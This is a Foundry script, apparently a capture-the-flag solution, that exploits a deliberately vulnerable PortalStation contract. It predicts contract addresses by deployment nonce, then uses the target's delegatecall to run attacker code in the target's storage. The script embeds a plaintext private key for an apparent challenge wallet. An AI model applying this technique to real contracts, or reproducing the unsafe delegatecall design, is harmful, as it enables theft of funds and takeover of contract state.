// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA);
    address wallet = 0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59;
    PortalStation public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c);

        address addr1 = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;
        address addr2 = 0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF;
        address addr3 = 0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1;

        for(uint256 i = 0; i  < 131; i++) {
            Hack hack = new Hack();
            address guess = address(hack);
            if((guess == addr1) || (guess == addr2) || (guess == addr3)) {
                console.log(guess);
                console.log(i);
                break;
            }
        }

        target.createPortal("orcKingdom");

        console.log(wallet.balance);
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// "PrivateKey": "0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c",
//     "Address": "0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59",
//     "TargetAddress": "0xACef632826fb9d4EF70cB70640b5F56b7474B3a9",
//     "setupAddress": "0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA"

contract Hack {
    mapping(string => address) public destinations;
    mapping(string => bool) public isPortalActive;
    bool isExpertStandby;

    function connect() external returns(bool) {
        isPortalActive["orcKingdom"] = true;
        return true;
    }

    // fallback() external payable {
    //     isPortalActive["orcKingdom"] = true;
    // }

}

contract Setup {
    PortalStation public immutable TARGET;

    constructor() payable {
        TARGET = new PortalStation();
    }

    function isSolved() public view returns (bool) {
        return TARGET.isPortalActive("orcKingdom");
    }
}

contract PortalStation {
    
    mapping(string => address) public destinations;
    mapping(string => bool) public isPortalActive;
    bool isExpertStandby;

    constructor() {
        destinations["orcKingdom"] = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;
        destinations["elfKingdom"] = 0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF;
        destinations["dawrfKingdom"] = 0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1;
        isPortalActive["elfKingdom"] = true;
    }

    function requestPortal(string calldata _destination) public payable {
        require(destinations[_destination] != address(0));
        require(isExpertStandby, "Portal expert has a day off");
        require(msg.value > 1337 ether);

        isPortalActive[_destination] = true;
    }

    function createPortal(string calldata _destination) public {
        require(destinations[_destination] != address(0));
        
        (bool success, bytes memory retValue) = destinations[_destination].delegatecall(abi.encodeWithSignature("connect()"));
        require(success, "Portal destination is currently not available");
        require(abi.decode(retValue, (bool)), "Connection failed");
    }

}